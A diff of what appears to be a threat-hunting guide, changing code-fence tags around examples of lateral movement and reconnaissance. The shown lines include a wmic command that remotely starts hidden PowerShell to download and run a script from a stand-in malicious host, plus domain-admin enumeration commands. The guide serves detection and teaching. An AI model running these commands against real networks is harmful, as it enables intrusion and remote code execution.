@@ -51,7 +51,7 @@ winword.exe → cmd.exe → powershell.exe → wmic.exe
 - PowerShell can then download a payload, and finally `wmic.exe` is used for the **lateral movement**.
 
 Here’s an example command that might be executed via `wmic.exe`:
-```powershell
+```bash
 wmic /node:"10.0.0.12" process call create "powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
 ```
 - `/node:"10.0.0.12"` → Targets another machine on the network.  
@@ -78,7 +78,7 @@ Things like **multiple login attempts**, **a low-privilege user suddenly logging
 #### 4. Suspicious Recon Activity
 
 These commands are often used to **map the network** and **identify valuable targets**:
-```
+```bash
 net view /domain
 net use
 net group "Domain Admins" /domain
